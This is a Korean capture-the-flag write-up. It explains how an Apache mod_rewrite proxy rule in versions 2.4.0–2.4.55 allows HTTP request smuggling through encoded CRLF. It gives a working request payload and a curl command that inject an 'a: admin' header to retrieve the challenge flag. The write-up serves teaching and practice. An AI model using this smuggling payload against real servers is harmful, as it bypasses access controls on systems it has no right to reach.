# Wiily Wonka Web

## 코드 분석

### **server.js**

a라는 HTTP 헤더가 있고 그 값이 admin이면 FLAG를 반환된다.

```jsx
// endpoints
app.get('/', async (req, res) => {
    if (req.header('a') && req.header('a') === 'admin') {
        return res.send(FLAG);
    }
    return res.send('Hello '+req.query.name.replace("<","").replace(">","")+'!');
});
```

### **httpd.conf**

백엔드 서버에 요청이 가기 전 리버스 프록시가 설정되어 있어 a라는 헤더가 삭제된다.

```apache
LoadModule rewrite_module modules/mod_rewrite.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

<VirtualHost *:80>

    ServerName localhost
    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on
    RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
    ProxyPassReverse "/name/" "http://backend:3000/"

    RequestHeader unset A
    RequestHeader unset a

</VirtualHost>
```

## **Exploit**

Apache HTTP Server 2.4.0 ~ 2.4.55의 mod_proxy 설정에는 **HTTP Request Smuggling** 취약점이 존재한다. Apache의 mod_proxy 환경에서 RewriteRule 또는 ProxyPassMatch를 설정할 때, 사용자로부터 받은 입력값을 그대로 치환해 백엔드 서버에 전달할 경우 발생한다.

RewriteEngine on 설정은 Apache의 mod_rewrite 모듈의 URL 재작성 기능(URL Rewriting)을 활성화 한다. 즉, 사용자가 요청한 URL을 서버가 내부적으로 다른 경로로 변경하는 것이다.

예를 들어, 문제와 같이 Apache 설정 파일이 다음과 같다고 가정한다.

```apache
RewriteRule "^/name/(.*)" "http://backend:3000/?name=$1" [P]
```

여기서 [P] 플래그는 Proxy의 약자로, RewriteRule이 URL 재작성 뿐만 아니라 프록시 요청까지 수행하라는 의미이다. 해당 설정은 요청 URL이 /name/으로 시작하는 모든 문자열을 정규표현식에 매칭시킨다.

결과적으로 http://localhost:1337/name/test로 요청을 보내면, 이 요청은 http://backend:3000/?name=test로 재작성되고, [P] 플래그에 의해 백엔드 서버로 프록시 요청이 전달된다.

따라서, 아래와 같이 인코딩된 CRLF(%0d%0a)를 삽입하면, Apache의 URL 재작성 과정에서 이 인코딩이 실제 개행 문자로 디코딩되고, 그 결과 요청 라인이 분리되며 "요청 안에 또 다른 요청"이 삽입된 구조가 만들어진다.

```plaintext
GET /name/a%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0a HTTP/1.1
Host: localhost:1337
```

이로 인해 Apache는 하나의 클라이언트 요청을 두 개의 HTTP 요청으로 오해하고, 백엔드로 조작된 프록시 요청을 전달하게 된다.

```plaintext
frontend-1  | 172.22.0.1 - - [19/May/2025:07:03:48 +0000] "GET /name/a%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0a HTTP/1.1" 200 15
backend-1   | 172.22.0.3 - - [19/May/2025:07:03:48 +0000] "GET /?name=a HTTP/1.1" 200 15 "-" "-"
```

이와 같이 헤더를 직접 전송하는 것이 아니라, 해당 문자열이 동적으로 헤더처럼 생성되도록 유도하여 서버 측의 헤더 검증을 우회할 수 있다.

```bash
$ curl https://wonka.chal.cyberjousting.com/name/a%20HTTP/1.1%0d%0aHost:%20localhost%0d%0aa:%20admin%0d%0a%0d%0a
byuctf{i_never_liked_w1lly_wonka}
```

## Reference

- https://domdom.tistory.com/670
- https://httpd.apache.org/docs/2.4/rewrite/proxy.html